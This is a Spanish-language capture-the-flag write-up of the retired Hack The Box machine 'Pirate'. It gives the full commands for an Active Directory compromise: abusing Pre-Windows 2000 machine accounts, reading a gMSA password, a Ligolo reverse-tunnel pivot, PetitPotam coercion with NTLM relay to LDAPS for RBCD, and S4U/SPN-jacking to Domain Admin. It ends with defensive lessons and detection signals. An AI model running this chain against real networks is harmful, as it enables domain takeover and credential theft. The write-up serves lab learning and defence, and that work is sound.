---
machine: Pirate
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, s4u2proxy]
---

# Pirate — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Dominio con dos segmentos. Se entra por una **cuenta de equipo Pre-Windows 2000** cuya contraseña es el nombre de la máquina en minúsculas (14 caracteres), se lee la contraseña de una **gMSA**, se pivota con **Ligolo-ng**, se coacciona a un servidor secundario con **PetitPotam** y se releva ese NTLM a **LDAPS** para escribir **RBCD**. Con delegación sobre el servidor web se hace **SPN jacking + S4U2Proxy** hasta Administrador de dominio.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389
```

DC con LDAP, Kerberos, SMB y WinRM. `nxc smb <IP>` devuelve el nombre del dominio; los equipos con `userAccountControl` que incluye el flag de cuenta Pre-Windows 2000 son el punto de entrada.

## Acceso inicial

```bash
nxc smb <DC> -u 'guest' -p '' --rid-brute 3000
```

Al listar equipos aparecen cuentas `LEGACY01$` y `MS01$`. La contraseña heredada es el nombre del equipo en minúsculas, truncado a 14 caracteres:

```bash
impacket-getTGT '<dominio>/MS01$:ms01' -dc-ip <DC>
export KRB5CCNAME=ms01\$.ccache
```

Con ese TGT se lee la contraseña de la **gMSA** (el ACE de lectura lo tiene el grupo Pre-Windows 2000):

```bash
nxc ldap <DC> -k --use-kcache --gmsa
```

Devuelve el hash NT de la cuenta de servicio, que ya abre WinRM en el equipo intermedio.

## Pivote al segundo segmento

```bash
# atacante
ip tuntap add user $USER mode tun ligolo && ip link set ligolo up
./proxy -selfcert

# en el equipo comprometido
./agent.exe -connect <IP_ATACANTE>:11601 -ignore-cert
# en el proxy: session -> start, y añadir la ruta del segundo segmento
```

```bash
nmap -p- 172.16.7.0/24
```

## RBCD por relevo de NTLM a LDAPS

Con el equipo intermedio como punto de apoyo se coacciona al servidor web:

```bash
python3 PetitPotam.py -u <usuario> -p <pass> -d <dominio> <IP_ESCUCHA> <IP_WEB>
```

```bash
ntlmrelayx.py -t ldaps://<DC> --delegate-access --escalate-user 'MS01$'
```

El relevo escribe `msDS-AllowedToActOnBehalfOfOtherIdentity` sobre el equipo web, de modo que `MS01$` puede delegar en él. Se pide un ticket de servicio como Administrador:

```bash
impacket-getST -spn cifs/<WEB> -impersonate Administrator -dc-ip <DC> '<dominio>/MS01$:<hash>'
export KRB5CCNAME=Administrator@cifs_web.ccache
```

## Salto final con SPN jacking

El mismo control sobre la cuenta permite escribir un SPN propio y abusar de `altservice`:

```bash
Rubeus.exe s4u /user:MS01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<WEB> /altservice:ldap /ptt
```

Con la delegación hacia el DC copiada al servicio `ldap`/`cifs` del controlador se llega a Administrador de dominio y se leen ambas flags desde `C:\Users\Administrator\Desktop\`.

## Lecciones

- Las cuentas de equipo con contraseña derivada del nombre siguen apareciendo en dominios viejos: hay que buscarlas y rotarlas.
- Leer una gMSA es lectura de credenciales de servicio de facto; el ACE debe limitarse al equipo que la usa.
- Coacción + relevo a LDAPS sigue funcionando si no hay firma ni canal seguro obligatorios.
- `WriteSPN` sobre una cuenta con delegación es dominio total: conviene auditar quién puede escribir `servicePrincipalName`.
- Detección: 445 saliente desde servidores, autenticaciones NTLM anómalas al DC y creación de objetos `msDS-AllowedToActOnBehalfOfOtherIdentity`.
